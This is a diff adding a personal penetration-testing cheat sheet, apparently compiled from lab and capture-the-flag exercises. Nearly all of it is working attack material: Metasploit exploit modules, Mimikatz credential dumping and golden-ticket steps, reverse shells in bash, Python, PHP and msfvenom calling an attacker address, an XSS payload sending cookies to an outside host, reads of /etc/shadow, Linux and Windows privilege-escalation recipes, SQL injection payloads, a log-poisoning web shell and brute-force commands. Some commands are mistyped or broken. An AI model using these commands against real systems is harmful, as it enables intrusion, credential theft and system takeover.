@@ -1,0 +1,1564 @@
+exploit/windows/http/icecast_header
+
+post/multi/recon/local_exploit_suggester
+
+getprivs
+
+migrate -N 
+
+load kiwi 
+
+creds_all
+
+golden_ticket_create
+
+un post/windows/manage/enable_rdp
+
+exploit/windows/http/icecast_header
+
+exploit/multi/handler
+
+run post/windows/gather/checkvm
+
+run post/multi/recon/local_exploit_suggester
+
+auxiliary/server/socks4a
+
+run autoroute -s 172.18.1.0 -n 255.255.255.0
+
+scp file.txt remote_username@10.10.0.2:/remote/directory
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
+
+smbclient //<ip>/anonymous
+
+smbget -R smb://<ip>/anonymous
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
+
+nc <IP> <port>  --- connect to proFtpd
+
+/var
+
+SITE CPFR /home/kenobi/.ssh/id_rsa
+
+SITE CPTO /var/tmp/id_rsa
+
+SITE CPFR and SITE CPTO 
+
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+#find suid binary 
+
+find -user root -perm -4000 -exec ls -ldb -type f 2>/dev/null {} \;
+
+in tmp : echo /bin/sh > curl 
+chmod 777 curl 
+export PATH=/tmp:$PATH
+/usr/bin/menu
+
+
+---------curl -I localhost----------
+
+
+CVE-2019-1388: hhupd.exe
+
+payload delivery: exploit/multi/script/web_delivery
+
+set powershell : PSH : target 
+
+windows/local/persistence
+
+run persistence -X
+
+gtfobin ---- binary database 
+
+
+
+--------------------
+
+
+powershell -ep bypass 
+
+. .\PowerView.ps1
+
+Get-NetUser | select cn 
+Get-NetGroup -GroupName *admin*
+Get-NetComputer -fulldata | select operatingsystemm 
+Invoke-ShareFinder
+neo4j console
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
+
+Running the .json <drag and drop> in BloodHound -- check queries -- check Kerberoastable
+
+
+cd Downloads && mimikaz.exe 
+
+privilege::debug --- if Privilege '20' ok --> means user is runnig with admin priv and works properly or not
+
+lsadump::lsa /patch --- dumping password hash NTLM 
+
+hash -m 1000 <hash> <wordlists> ---- 
+
+
+--------------------
+
+running with golden tickets 
+
+lsadump::lsa /inject /name:<user> 
+
+Domain (....) / <id> 
+
+RID : (....) 
+User:<user> 
+
+* Primary 
+	NTLM: <hash> 
+
+-------------------
+
+creating golden ticket 
+
+	kerberos::golden /user: /domain: /sid: /<user>: /id: 
+	<example: kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /<user>:<hash> /id:500
+
+---------------------
+
+getting elevated privilege shell 
+
+misc::cmd 
+
+-------------
+
+moving around power shell 
+
+dir \\Desktop-1\c$
+
+PsExec.exe \\Desktop-1 cmd.exe 
+
+hostname
+
+-------------
+
+going into machine via 'rdp' w/remmina 
+
+checking eventLog, user and domain admins 
+
+-------------
+
+Payload creation with msfvenom for persistence backdoor 
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o payload.exe
+
+using scp to transfer payload on target
+
+open listing port on attacking machine with multi/handler 
+
+using persistence module to open backdoor
+
+---------------
+
+eternal blue --- window 7 Digi Vuln 
+
+exploit/windows/smb/ms17_010_eternalblue
+
+post/multi/manage/shell_to_meterpreter ---- shell to meterpreter 
+
+migrate to root privilege process ps 
+
+find -name user.txt
+
+
+--------------
+
+ftp <ip> 
+
+nc <ip> port 
+
+nc -lvnp <ip> <port> 
+-------------------------------------
+sudo sh -c 'cp $(which systemctl) .; chmod +s /bin/sh'
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./bin/usr/systemctl link $TF
+./bin/usr/systemctl enable --now $TF
+
+-------------------------------
+
+ssh user@<ip> 
+ssh -i id_rsa user@<ip> 
+
+-------------------------------
+
+ssh2joh <hash> > <john.txt> 
+john -w <wordlists> john.txt -format=NT | tee john.log 
+
+------------------------------
+
+enum4linux
+linpeas.sh 
+
+---------------------------
+
+http-post-form "/...../.....:username=^USER^&password=^PASS^:Invalid response" 
+
+inspect element : run first time : get error : select POST method : click edit and edit and resend : check request at the bottom 
+
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.193.248 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
+
+
+
+-------------------
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/
+https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
+https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e
+
+
+sudo -l 
+
+
+
+------------
+
+sudo nmap -sC -sV --script=default,vuln -p- -T5 10.10.10.86 
+
+
+-------------
+
+evil-winrm 
+powershell-empire
+steghide
+patator 
+nikto 
+hash identifier 
+hash -m -j <hash> 
+curl 
+nc 
+ncat
+hashcat
+nc -l -p 6996 -e /bin/bash  ---->>  bindshell spwning 
+nc <IP> -p 6996
+nc -lvnp 6996
+
+
+-------------
+
+ExploitDB 
+NVD 
+CVE Mitre 
+
+Linux_CLI --- searchsploit --- local database 
+
+-------------
+
+lsb_release -a  ---> check ubuntu version 
+
+ps -p $$ ----> bash/shell current version 
+
+---------------
+
+# sqlite  --- >> opening 
+
+sqlite3 <database.db> 
+.tables ----> content dir and tables 
+
+PRAGMA table_info(users);  ----> tables header
+
+SELECT * FROM users; ----> exposed the tables and its content
+
+
+------------
+
+cross site scripting 
+---
+__> browser enabling -->>> about:config 
+XSS enabling         -->>> browswer.url.filter >> boolean >> set to True
+	             
+
+Stored XSS
+Reflected XSS
+DOM-Based XSS 
+
+Popup payload ----- <script> alert("hello") </script> 
+
+
+
+ <html>
+<head>
+<script>
+function newDoc() {
+  window.location.assign("https://www.w3schools.com")
+
+}
+</script>
+</head>
+<body>
+
+<input type="button" value="Load new document" onclick="newDoc()">
+
+</body>
+</html> 
+---------------------------------------------------------
+ 
+<head>
+<script>
+function newDoc() {
+ alert(window.location.hostname)
+}
+</script>
+</head>
+<body>
+
+<input type="button" value="show ip" onclick="newDoc()"></body> 
+----------------------------------
+
+<script>
+function myFunction() {
+  document.title = "I am a hacker";
+}
+</script>
+<body>
+<input type="button"  value="clickme" onclick=myFunction()>
+</body>
+
+</body>
+-----------------------
+ <script> function newDoc() {  alert(window.location.hostname) } </script> </head> <body>  <input type="button" value="show ip" onclick="newDoc()">  </body>
+
+-------
+<html>
+
+<head>
+<title>Hello this is the title</title> 
+</head>
+
+<body>
+<p> And this is the paragraph </p>
+<p style='margin: 0'>click to get cookies <a href="#" data-toggle="olala" data-target="#hints">clickME</a></p>
+<div class="olala" id="hints">
+<h6>Cookies ! </h6>
+<p> This is the document cookies <code>document.cookies</code></p>
+</div>
+
+</body>
+
+</html>
+---------
+<html>
+
+<head>
+<title>Hello this is the title</title> 
+</head>
+
+<body>
+<p> And this is the paragraph </p>
+<p> This is the document cookies <code>document.cookies</code></p>
+
+</body>
+</html>
+
+-----------------
+
+
+
+<body>
+<p> And this is the paragraph </p>
+<p style='margin: 0'>click to get cookies <a href="#" data-toggle="olala" data-target="#hints">clickME</a></p>
+<div class="olala" id="hints">
+<h6>Cookies ! </h6>
+<p> This is the document cookies <code>document.cookies</code></p>
+</div>
+
+</body>
+
+
+---------------
+
+<script>alert(document.cookie)</script>
+
+
+<script> document.title = "I am a hacker"; </script>
+ <div class="popup" onclick="myFunction()">Click me!
+  <span class="popuptext" id="myPopup">Popup text...</span>
+</div> 
+
+<script>
+// When the user clicks on <div>, open the popup
+function myFunction() {
+  var popup = document.getElementById("myPopup");
+  popup.classList.toggle("show");
+}
+</script>
+
+----------------
+
+<code>alert(document.title = "I am a hacker") </code>
+---------------
+
+
+<script>
+function myFunction() {
+  document.querySelector("#thm-title").textContent = "I am a hacker";
+}
+</script> 
+
+<input type="button" value="clickMe" onClick=myFunction()>
+
+---------------
+
+<script> 
+  document.querySelector("#thm-title").textContent = "I am a hacker";
+</script>
+
+
+-------
+
+sqlinjection command 
+-------------------- 
+
+sqlmap -u 10.10.37.86  --data "msg=test" --method POST -p "msg" --level=3 --batch
+
+sqlmap -u 10.10.37.86 --data "msg=test" --method POST -p "msg" --level=3 --batch --tables
+
+sqlmap -u 10.10.37.86 --data "msg=test" --method POST -p "msg" --level=3 --batch --tables -D tests --dump-all
+
+------------
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/bin/bash -c '/bin/bash -i > &/dv/tcp/10.9.116.83/4444 0>&1'>>>>> error
+
+echo $(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.116.83/9999 0>&1')
+
+
+netstat -anlp | grep LISTEN
+
+-----------
+
+socat listener and exploitation 
+
+sudo socat - TCP4:10.10.232.147:4444 --- attacker 
+
+sudo socat TCP4-LISTEN:4444,reuseaddr EXEC:"/bin/sh" --- victim 
+
+-------------
+#getting reverse shell and it need to listene on attacking 
+
+python3 -c 'import socket,subprocess,	os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.116.83",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+-------------
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' >> getting proper shell 
+
+#foregrounding the shell 
+
+stty raw -echo;fg
+
+
+------------
+
+
+
+{"company":"The Best Festival Company", "username":"santa"}
+
+
+7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d0d0a
+
+
+----------------
+
+
+sudo sqlmap -r burp3  --tables --columns --tamper=space2comment --dbms SQLite  --dump-all --batch 
+
+--------------
+
+ftp getting every txt file 
+
+mget *.txt
+
+--------------
+
+<script type=“text/javascript”>document.location=“http://192.168.0.48:5000/?c=“+document.cookie;</script>
+
+
+--------------
+
+
+ip.src == 
+ip.dst ==
+tcp.port == 22 / udp.port == 67
+http.request.method == GET  / http.request.method == POST 
+ip.addr ==
+ip.addr != 
+ip.addr ==  && ip.addr == 
+
+----------------------------------
+sudo tcpdump -i tun0 icmp
+
+ss -ltn | grep -i 22
+
+---------
+whereis ----> finding binaries path 
+
+---------
+
+# port forwarding with chisel 
+# reverse tunneling
+# server side (attacker)(local) 
+
+sudo chisel server --reverse --port 9002 
+
+
+# client side (remote)(victim)
+
+''''''''
+./chisel client 10.9.116.83:9002 R:9003:172.17.0.1:22 
+
+						or 
+
+./chisel client 10.9.116.83:9002 R:10.9.116.83:8080:127.0.0.1:8080
+
+''''''''
+
+# attacker side command execution through reverse tunnel 
+
+ssh ramsey@127.0.0.1 -p 9003 
+
+# brute force hydra through reverse tunnel 
+
+hydra -l ^user^ -P ^wordlist^ -s 9003 ssh://127.0.0.1 
+
+--------------------------
+
+sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
+
+sudo -u root PYTHONPATH=/home/oliver/evilDir /usr/bin/python /opt/dockerScript.py # need to creat malicious python code at evilDir
+# __init__.py => directory 
+# docker.py => directory 
+--------------------------		 
+# import os 		 |
+# os.system('bash')      |
+--------------------------
+
+--------------------------
+
+sending files with 									 
+
+# sender end 
+nc -w 3 <ip> 1234 < out.file
+
+# reciever end 
+nc -l -p 1234 > out.file
+
+
+>>> import zlib
+>>> h = open("29.zlib","r")
+>>> data = h.read()
+>>> zlib.decompress(data)
+
+
+-----------------------
+wordpress enumeration 
+wpscan --url 10.10.14.4/wordpress -e u  >> e = enumerate, u = user, ap=plugin
+wpscan --url 10.10.14.4/wordpress -e ap
+
+---------------------
+
+
+
+find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"   # finding file 
+
+find / -perm -u=s -type f 2>/dev/null   # finding suid file
+
+
+---------------------
+
+cat /etc/crontab
+
+
+
+--------------------
+enum4linux -U <IP>   #user enumeration
+enum4linux -S <IP>   #share enumeration 
+enum4linux -a <iP>   # everything 
+
+smbclient //10.10.179.49/tbfc-santa
+
+---------------------
+
+gpg --import somefile.key
+gpg --decrypt message.gpg
+
+---------------------
+
+    Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
+    Locating other services running or applications installed that may be abusable (SUID & out of date software)
+    Looking for automated scripts like backup scripts (exploiting crontabs)
+    Credentials (user accounts, application config files..)
+    Mis-configured file and directory permissions
+
+----------------------
+chmod u+s /usr/bin/cp
+
+find / -perm -u=s -type f 2>/dev/null
+
+cp -R /root/ .  #copying whole directory
+
+python3 -m http.server 8080
+
+nc -l -p 1337 > LinEnum.sh
+nc -w -3 10.10.119.218 1337 < LinEnum.sh
+
+
+/var/log/auth.log
+/var/log/syslog
+/var/log/<service/"
+For example, the access logs of apache2
+
+    /var/log/apache2/access.log"
+
+LFILE=/etc/shadow;HISTTIMEFORMAT=$'\r\e[K';history -r $LFILE;history
+
+sudo sh -c 'cp $(which bash) .; chmod +s ./bash' ; ./bash -p
+
+export LFILE=/etc/sudoers;bash -c 'echo "$(<$LFILE)"'
+
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games=:/home/dwight/Downloads/sublime_text_3/
+
+export PATH="/home/rageshl/dev/flutter/bin:$PATH"
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+
+source ~/.bashrc
+--------------------------------------------
+
+	 # sudoers checking
+
+# kernel version checking 
+
+hostnamectl 
+demsg | grep Linux 
+uname -r 
+
+cat /etc/*release
+
+--------------------------
+
+mysql service exploit local escalation 
+
+/home/user/tools/mysql-udf #path
+
+gcc -g -c raptor_udf2.c -fPIC
+
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+mysql -u root #login into sql 
+
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+
+/tmp/rootbash -p
+
+-----------------------------------
+
+ps aux | grep mysql 
+
+smbclient -N -L \\\\<ip>
+
+smbclient \\\\<ip>\\<dir>
+
+smbmap -H <ip> -R # R is recursive 
+
+-----------------------------------
+
+# powershell cmdlets 
+# moving around the powershell 
+
+
+
+Get-ChildItem -Filter *3* -Directory  -Hidden -Recurse  -ErrorAction SilentlyContinue
+Get-Content 
+Set-Location -Path C:\\\\\\
+Set-String
+Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue 
+Filter
+File 
+Directory 
+Recure
+Hidden
+Path 
+
+Select-String 2.txt -Pattern 'Red*Ryder' 
+
+(Get-Content 1.txt)[551] 
+
+Get-Content 1.txt | Measure-Object -Word 
+
+Get-ChildItem -File -Hidden
+
+Get-Help Get-Content
+
+-----------------------------------
+# Reading hash inside .txt or binary # can help to validate the 
+# authentication of the file or binary like MD5 checksum
+
+Get-FileHash -Algorithm MD5 file.txt
+
+# String Scanning tool allowing you to view the strings inside binary
+# possibly another hidden binary inside binary 
+
+c:\Tools\strings64.exe -accepteula file.exe
+
+# Alternate Data Stream ADS to view hidden database inside binary(.exe) 
+
+Get-Item -Path file.exe -Stream * # viewing ADS: Alternate Data Stream
+
+# window default cmdlet to execute the hidden binary inside binary
+
+# Windows Management Instrumentation to launch hidden file 
+
+# Note: give absolute path to cmd!
+
+wmic process call create $(Resolve-Path file.exe:streamname)
+
+wmic process call create $(Resolve-Path C:\Users\littlehelper\Documents\deebee.exe:hidedb)
+
+
+------------------------------------
+
+sudo -u root  apache2 -f /etc/shadow
+
+------------------------------------
+
+#preload and shared escalation
+
+sudo -l 
+
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+
+#library manipulation 
+
+ldd /usr/sbin/apache2 #checking library as low user
+ 
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+sudo LD_LIBRARY_PATH=/tmp apache2	
+
+--------------------------------------
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+#Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+
+chmod +x /home/user/shell.elf
+
+#Create these two files in /home/user:
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+
+--------------------------------------
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null #suid + sgid
+
+export TERM=xterm
+
+
+stty raw -echo; fg
+
+
+mysql 
+
+mysql -uUSERNAME -p 
+
+show DATABASE;
+
+show tables;
+
+SELECT  * FROM  users; 
+
+lxc image list 
+
+------------------
+
+show databases;
+use tron;
+show tables;
+SELECT * FROM users; 
+
+# lxc lxd ---- escalation uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+-------------------------------------------------------------
+#lxd_image_git
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+
+#on_victim_machine_giving_lxd image to  alias name 
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage/Alpine
+
+
+-------------------------------------------------------------
+#checking to make sure victim recieve the lxd-image
+lxc image list 
+
+
+Note: hello is CONTAINER NAME 
+
+#Giving the high privilege
+lxc init Alpine hello -c security.privileged=true
+
+
+#mounting lxc high privileged container on root path
+lxc config device add hello DEVICENAME disk source=/ path=/mnt/root recursive=true 
+
+#starting lxc
+lxc start hello
+
+#executing the container with root privilege 
+lxc exec CONTAINERNAME /bin/sh
+
+id
+
+# getting into mount disk 
+cd /mnt/root/root
+----------------------------------------------
+arp -a
+
+------------------------------------------------
+# shared object injection 
+# suid
+
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+./suid-so 
+------------------------------------------------------------------------
+
+
+#SUID / SGID Executables - Environment Variables 
+
+/usr/local/bin/suid-env
+
+strings /usr/local/bin/suid-env
+
+gcc -o service /home/user/tools/suid/service.c
+
+PATH=.:$PATH /usr/local/bin/suid-env
+
+-----------------------------------------------------
+
+export PATH=/home/rabbit:$PATH
+
+-----------------------------------------------------
+# SUID / SGID Executables - Abusing Shell Features (#1) 
+# In Bash versions <4.2-048
+
+
+user@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+user@debian:~$ function
+-bash: syntax error near unexpected token `newline'
+user@debian:~$ function /usr/sbin/service { /bin/bash -p; } 
+user@debian:~$ export -f /usr/sbin/service 
+user@debian:~$ /usr/local/bin/suid-env2
+root@debian:~# 
+
+--------------------------------------------------
+
+#  SUID / SGID Executables - Abusing Shell Features (#2) 
+# This will not work on Bash versions 4.4 
+
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+/tmp/rootbash -p
+
+----------------------------------------------------
+
+cat ~/.*history | less
+
+---------------------------------------------------
+
+config files 
+
+backups incorrect permissions 
+
+# hidden files viewing 
+
+ls -la / 
+ls -la /.ssh 
+
+# NFS 	
+
+# file create via NFS inherit the remote user id 
+
+# if remote user (attacker) is root, and root squashing is enabled on victim machine, 
+# the escalation will fail 
+# else it will success 
+
+# checking the squash 
+
+cat /etc/exports
+
+no_root_squash at /tmp 
+
+mkdir /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/payload.elf
+chmod +xs payload.elf
+
+# need to mount on attacker side
+
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+or 
+mount -t nfs -o vers=3,proto=tcp,nolock,noacl,sync  10.10.247.137:/tmp /tmp/nfs
+
+/tmp/./payload.elf 
+
+-----------------------------------------
+# Kernel exploit 
+# Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+
+use 'Linux Exploit Suggestor 2' to detect potential kernel exploit and vul
+
+------------------------------------------
+- python3 -c "import pty;pty.spawn('/bin/bash')"
+- Press 'Ctrl' + 'Z' to background the program.
+- stty raw -echo
+- fg
+- export TERM=xterm-256color
+
+
+
+<? system('wget http://10.9.116.83:8000/somefile.phtml -O /var/www/shell.php');?>
+
+	
+
+Wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=admin&password=FUZZ” -u <TARGET_URL>
+
+#log poisoning
+when get access the log 
+/var/log/apache2/access.log 
+burp header agent --- <?php system($_GET['cmd']);?>
+User-Agent: Mozilla/5.0 <?php system($_GET['cmd']) ?> Gecko/20100101 Firefox/78.0
+/var/log/apache2/access.log
+
+
+php -r '$sock=fsockopen("10.9.116.83",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+bash -i >& /dev/tcp/10.9.116.83/1234 0>&1'
+
+http://10.10.87.36/admin?user=2
+http://10.10.87.36/admin?user=2 order by <number>
+http://10.10.87.36/admin?user=0 union select 1,2,3,4
+http://10.10.87.36/admin?user=0 union select 1,database(),3,4
+http://10.10.87.36/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'
+http://10.10.89.158/admin?user=0%20union%20select%201,%20group_concat(column_name),%203,4%20from%20information_schema.columns%20where%20table_name=%27users%27
+
+10.10.89.158/admin?user=0 union select 1, group_concat(column_name), 3,4 from information_schema.columns where table_name='messages'
+
+
+sudo hydra -L userlist -P /usr/share/wordlists/rockyou.txt 10.10.238.230 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
+wpscan --url <url> --enumerate u 
+wpscan --url <url> -U <username> --passwords <wordlist_path>
+
+
+------------------------------------------
+Window PE | 
+----------
+Weak Reg Path
+---------------
+
+sc qc regsvc #query the service permission 
+
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+#checking service permission with accesschk.exe 
+
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f #overwriting the registry image path 
+
+net start regsvc #start the exploited service 
+
+
+-------------------------------------------
+
+
+C:\PrivEsc\accesschk.exe /acceptula -uwdq "C:\Program Files\Unquoted Path Service\Commmon\unquotedpathservice.exe" 
+
+C:\PrivEsc\accesschk.exe /acceptula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+
+-------------------------------------------
+#weak file permission 
+#insecure servcie executables
+
+sc qc filepermsvc 
+
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+
+net start filepermsvc
+
+---------------------------------------------
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.174.63
+
+
+reg query HKLM /f password /t REG_SZ /s
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+winexe -U 'admin%password' //10.10.35.109 cmd.exe
+
+---------------------------------------------
+
+runas /user:admin /savecred C:\PrivEsc\reverse.exe
+
+
+pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U
+
+
+pip install pycrypto
+# or
+pip install pycryptodome
+
+python get-pip.py # in tmp 
+
+---------------------------------------------
+
+# hashcat 	
+
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+
+----------------------------------------------
+
+# pass the hash
+
+pth-winexe -U 'admin%hash' //10.10.196.128 cmd.exe
+
+----------------------------------------------
+
+# scheduled tasks 
+
+type C:\DevTools\CleanUp.ps1
+
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+----------------------------------------------
+
+# SYSTEM AND SAM 
+# DUMPING HASHES and pass the hash
+
+python2 ~/creddump7/pwdump.py SYSTEM SAM 
+
+----------------------------------------------
+
+# start up 
+
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+cscript C:\PrivEsc\CreateShortcut.vbs
+
+rdesktop -u admin 10.10.183.234 # starting up 
+
+---------------------------------------------
+# error error error
+# triggering elevated shell with PSExec64.exe 
+
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.183.234:9999
+
+sudo nc -lvnp 443
+
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+--------------------------
+# Rotten Potato Exploit
+# RoguePotato exploit
+# only on admin shell 
+
+C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+
+sudo nc -lvnp 443
+---------------------------------------------
+
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.183.234:9999 #redirector on kali
+
+# login with admin and exec cmd.exe with admin privi
+
+listen on kali with 'sudo nc -lvnp 443'
+
+# then execute following on remote admin shell 
+
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+---------------------------------------------
+# token impersonation 	
+# printer spoofer double exploitation with PSExec64.exe 
+# Note : using two stages reverse shell - one for local service account and other for system account
+# local admin user account > local service account  > NT system account 
+
+
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse2.exe" -i
+
+---------------------------------------------
+
+# Window Potential PE Finder Tools 
+
+winPEASany.exe
+
+Seatbelt.exe
+
+PowerUp.ps1
+
+SharpUp.exe
+
+# tools 
+
+-a----        2/22/2020   9:38 PM         222592 accesschk.exe
+-a----         6/5/2020   8:32 AM            959 AdminPaint.lnk
+-a----        2/22/2020   9:38 PM            232 CreateShortcut.vbs
+-a----         6/5/2020   8:32 AM            990 lpe.bat
+-a----        2/22/2020   9:38 PM         678312 plink.exe
+-a----        2/22/2020   9:38 PM         494860 PowerUp.ps1
+-a----         6/5/2020   9:06 AM          27136 PrintSpoofer.exe
+-a----        2/22/2020   9:38 PM        1258824 Procmon64.exe
+-a----        2/22/2020   9:38 PM         374944 PsExec64.exe
+-a----        1/12/2021   7:57 PM           7168 reverse.exe
+-a----        1/15/2021  10:47 AM           7168 reverse2.exe
+-a----        5/11/2020   9:23 AM         159232 RoguePotato.exe
+-a----         6/5/2020   8:32 AM            221 savecred.bat
+-a----        2/22/2020   9:38 PM         160768 Seatbelt.exe
+-a----        2/22/2020   9:38 PM          26112 SharpUp.exe
+-a----         3/6/2020   7:00 PM         229376 winPEASany.exe
+
+
+    Directory: C:\DevTools
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/5/2020   8:32 AM            173 CleanUp.ps1
+--------------------------------------------
+# attacker-kali to window-vic files copying with smbserver 
+
+locate smbserver.py 
+python3 /path/to/smbserver.py kali . 
+copy //ip/kali/exe C:\Dir\
+
+--------------------------------------------
+
+mkpasswd -m sha-512 newpasswordhere
+
+--------------------------------------------
+ruby interactive shell (irb) 
+
+Dir.pwd 
+Dir.chdir('/home/user') 
+Dir.entries('.')
+file = File.read('flag.txt')
+file = File.open('flag.txt', 'r') 
+file = FIle.open('flag.txt', 'w')
+
+# Dangerous PATH 
+
+But it doesn’t use full path for cp command. So, we can create our own binary named cp
+
+----------------------------------------------------------------------------------------
+
+
+# SQL injection UPDATE STATEMENT Injection 
+
+
+# MySQL and MSSQL
+',nickName=@@version,email='
+# For Oracle
+',nickName=(SELECT banner FROM v$version),email='
+# For SQLite
+',nickName=sqlite_version(),email='
+
+
+',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+
+',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
+
+',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
+
+', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
+
+ 	CREATE TABLE secrets ( id integer primary key, author integer not null, secret text not null )
+
+
+',nickName=(SELECT group_concat(secret || ":") from secrets),email='
+
+
+
+
+ 1' UNION SELECT NULL-- -
+ 1' UNION SELECT NULL, NULL-- -
+ 1' UNION SELECT NULL, NULL, NULL-- -
+
+
+' UNION SELECT 1, password from users-- -
+' UNION SELECT 1,group_concat(password) FROM users-- -
+
+' UNION SELECT 1,group_concat(password) FROM users-- -
+
+--------------------------------------------------------------------------------------------------------
+
+# sqli important
+
+#list table 
+1' UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
+
+#enumrate the table get the column 
+1' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -
+
+#dump the data of columns from the table
+1' UNION SELECT 1,group_concat(username || "," || password || ":") from users-- -
+
+---------------------------------------------------------------------------------------------------------
+
+Logged in as CREATE TABLE users ( id integer primary key, username text unique not null, password text not null ) |
